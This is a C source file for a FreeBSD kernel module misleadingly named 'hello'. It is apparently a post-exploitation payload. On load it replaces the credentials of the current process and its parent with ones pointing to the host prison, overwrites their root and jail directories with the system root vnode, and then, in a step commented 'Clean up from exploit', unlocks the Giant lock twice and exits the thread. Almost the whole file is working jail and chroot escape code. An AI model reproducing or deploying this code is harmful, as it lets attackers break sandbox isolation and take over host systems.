#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>   /* printf */
#include <sys/proc.h>
#include <sys/jail.h>
#include <sys/ucred.h>
#include <sys/mutex.h>
#include <sys/filedesc.h>
#include <sys/vnode.h>
#include <sys/mount.h>
#include <sys/fcntl.h>
#include <sys/namei.h>

extern struct mtx Giant;
extern struct prison prison0;

void poc_unjail_current_process(void);
void poc_unjail_parent_process(void);
void poc_escape_chroot_current_process(void);
void poc_escape_chroot_parent_process(void);

void print_current_process_jdir(void);
void print_parent_process_jdir(void);
void print_jdir(void);
void print_jail_path(void);
void print_vnode(void);

void
poc_unjail_current_process(void)
{
    struct thread *td = curthread;
    struct proc   *p  = td->td_proc;
    struct ucred  *oldcr, *newcr;

    PROC_LOCK(p);

    oldcr = td->td_ucred;

    printf("poc_unjail_current_process: 1\n");
    /* duplicate creds (also copies refcounts for groups, etc.) */
    newcr = crdup(oldcr);

    printf("poc_unjail_current_process: 2\n");
    /* bump refcount on prison0 for safety */
    prison_hold(&prison0);
    newcr->cr_prison = &prison0;

    /* point both thread + proc to new creds */
    td->td_ucred = newcr;
    p->p_ucred   = newcr;

    printf("poc_unjail_current_process: 3\n");
    PROC_UNLOCK(p);

    printf("poc_unjail_current_process: 4\n");
    /* drop old cred */
    crfree(oldcr);

    printf("poc_unjail_current_process: 5\n");
}

void
poc_unjail_parent_process(void)
{
    struct thread *td = curthread;
    struct proc   *p  = td->td_proc;
    struct proc   *pp;
    struct ucred  *oldcr, *newcr;

    printf("poc_unjail_parent_process: 1\n");
    PROC_LOCK(p);
    pp = p->p_pptr;
    if (pp == NULL) {
        printf("poc_unjail_parent_process: 1a\n");
        PROC_UNLOCK(p);
        return;
    }
    printf("poc_unjail_parent_process: 2\n");
    PROC_LOCK(pp);
    printf("poc_unjail_parent_process: 3\n");
    PROC_UNLOCK(p);   /* don't hold both longer than needed */

    oldcr = pp->p_ucred;
    printf("poc_unjail_parent_process: 4\n");
    newcr = crdup(oldcr);

    printf("poc_unjail_parent_process: 5\n");
    prison_hold(&prison0);
    newcr->cr_prison = &prison0;

    /* set process cred */
    pp->p_ucred = newcr;

    /* set each thread's cred (for stuff that looks at td_ucred) */
    struct thread *td2;
    printf("poc_unjail_parent_process: 6\n");
    FOREACH_THREAD_IN_PROC(pp, td2) {
        printf("poc_unjail_parent_process: 6a\n");
        td2->td_ucred = newcr;
    }

    printf("poc_unjail_parent_process: 7\n");
    PROC_UNLOCK(pp);

    printf("poc_unjail_parent_process: 8\n");
    crfree(oldcr);
    printf("poc_unjail_parent_process: 9\n");
}

// void poc_escape_chroot(void) {
//     struct thread *td = curthread;
//     struct nameidata nd;
//     struct vnode *vp;
//     int error;

//     char *path = "/";
//     NDINIT(&nd, LOOKUP, FOLLOW, UIO_SYSSPACE, path);
//     error = namei(&nd);
//     if (error != 0) {
//       printf("namei() error: %d\n", error);
//     };
//     vp = nd.ni_vp;

//     printf("begin: pwd_chroot()\n");
//     error = pwd_chroot(td, vp);
//     if (error != 0) {
//       printf("pwd_chroot() error: %d\n", error);
//     };
//     printf("end: pwd_chroot()\n");
// }

void print_current_process_jdir(void) {
    struct thread *td = curthread;
    struct proc   *p  = td->td_proc;
    struct pwddesc *pdp;
    struct pwd *pwd;

    printf("pid %d: fetching current pwd...\n", p->p_pid);

    pdp = p->p_pd;
    /* Step 1: Get SMR-protected pwd pointer */
    pwd = vfs_smr_entered_load(&pdp->pd_pwd);
    if (pwd == NULL) {
        printf("current pwd_get_smr returned NULL\n");
        return;
    }

    /* Step 2: Take a stable reference */
    if (!pwd_hold_smr(pwd)) {
        printf("current pwd_hold_smr failed\n");
        return;
    }

    /* Step 3: Extract jdir vnode safely */
    struct vnode *jdir = pwd->pwd_jdir;
    if (jdir == NULL) {
        printf("current pwd_jdir is NULL\n");
        pwd_drop(pwd);
        return;
    }

    /* Step 4: Extract mount structure */
    struct mount *mp = jdir->v_mount;
    if (mp == NULL) {
        printf("current vnode has no mount point\n");
        pwd_drop(pwd);
        return;
    }

    printf("current jdir mount point: %s\n", mp->mnt_stat.f_mntonname);

    /* Step 5: Release reference */
    pwd_drop(pwd);
}

void print_parent_process_jdir(void) {
    struct thread *td = curthread;
    struct proc   *p  = td->td_proc;
    struct proc   *pp;
    struct pwddesc *pdp;
    struct pwd *pwd;

    pp = p->p_pptr;
    printf("pid %d: fetching parent pwd...\n", pp->p_pid);

    pdp = pp->p_pd;
    /* Step 1: Get SMR-protected pwd pointer */
    pwd = vfs_smr_entered_load(&pdp->pd_pwd);
    if (pwd == NULL) {
        printf("parent pwd_get_smr returned NULL\n");
        return;
    }

    /* Step 2: Take a stable reference */
    if (!pwd_hold_smr(pwd)) {
        printf("parent pwd_hold_smr failed\n");
        return;
    }

    /* Step 3: Extract jdir vnode safely */
    struct vnode *jdir = pwd->pwd_jdir;
    if (jdir == NULL) {
        printf("parent pwd_jdir is NULL\n");
        pwd_drop(pwd);
        return;
    }

    /* Step 4: Extract mount structure */
    struct mount *mp = jdir->v_mount;
    if (mp == NULL) {
        printf("parent vnode has no mount point\n");
        pwd_drop(pwd);
        return;
    }

    printf("parent jdir mount point: %s\n", mp->mnt_stat.f_mntonname);

    /* Step 5: Release reference */
    pwd_drop(pwd);
}

void poc_escape_chroot_current_process(void) {
    struct thread   *td = curthread;
    struct proc     *p  = td->td_proc;
    struct pwddesc  *process_pwd_desc;

    process_pwd_desc = p->p_pd;
    PWDDESC_XLOCK(process_pwd_desc);

    struct pwd *pwdptr = *(struct pwd **)&process_pwd_desc->pd_pwd;
    pwdptr->pwd_cdir = rootvnode;
    pwdptr->pwd_rdir = rootvnode;
    pwdptr->pwd_jdir = rootvnode;

    PWDDESC_XUNLOCK(process_pwd_desc);
}

void poc_escape_chroot_parent_process(void) {
    struct thread   *td = curthread;
    struct proc     *p  = td->td_proc;
    struct proc   *pp;
    struct pwddesc  *process_pwd_desc;

    pp = p->p_pptr;
    process_pwd_desc = pp->p_pd;
    PWDDESC_XLOCK(process_pwd_desc);

    struct pwd *pwdptr = *(struct pwd **)&process_pwd_desc->pd_pwd;
    pwdptr->pwd_cdir = rootvnode;
    pwdptr->pwd_rdir = rootvnode;
    pwdptr->pwd_jdir = rootvnode;

    PWDDESC_XUNLOCK(process_pwd_desc);
}

void print_jail_path(void)
{
    struct thread *td = curthread;
    struct ucred *cred = td->td_ucred;

    printf("********** Jail path: %s\n", cred->cr_prison->pr_path);
}

/*
 * Event handler for the module.
 */
static int
hello_modevent(module_t mod __unused, int event, void *arg __unused)
{
    switch (event) {
    case MOD_LOAD:
        printf("hello: Hello, kernel world!\n");

        printf("begin: print_jail_path() 1\n");
        print_jail_path();
        printf("end: print_jail_path() 1\n");

        printf("begin: poc_unjail_current_process()\n");
        poc_unjail_current_process();
        printf("end: poc_unjail_current_process()\n");

        printf("begin: poc_unjail_parent_process()\n");
        poc_unjail_parent_process();
        printf("end: poc_unjail_parent_process()\n");

        printf("begin: poc_escape_chroot_current_process()\n");
        poc_escape_chroot_current_process();
        printf("end: poc_escape_chroot_current_process()\n");

        printf("begin: poc_escape_chroot_parent_process()\n");
        poc_escape_chroot_parent_process();
        printf("end: poc_escape_chroot_parent_process()\n");

        printf("begin: print_jail_path() 2\n");
        print_jail_path();
        printf("end: print_jail_path() 2\n");

        // Clean up from exploit
        printf("begin 1: mtx_unlock() address: %p\n", &Giant);
        mtx_unlock(&Giant);
        printf("end 1: mtx_unlock()\n");

        printf("begin 2: mtx_unlock() address: %p\n", &Giant);
        mtx_unlock(&Giant);
        printf("end 2: mtx_unlock()\n");

        struct thread *td = curthread;
        struct proc *p = td->td_proc;

        printf("begin: PROC_LOCK()\n");
        PROC_LOCK(p);
        printf("end: PROC_LOCK()\n");

        printf("begin: thread_exit()\n");
        thread_exit();
        printf("end: thread_exit()\n");
        break;
    case MOD_UNLOAD:
        printf("hello: Goodbye, kernel world!\n");
        break;
    default:
        return (EOPNOTSUPP);
    }

    return (0);
}

static moduledata_t hello_mod = {
    "hello",            /* module name */
    hello_modevent,     /* event handler */
    NULL                /* extra data */
};

DECLARE_MODULE(hello, hello_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
MODULE_VERSION(hello, 1);
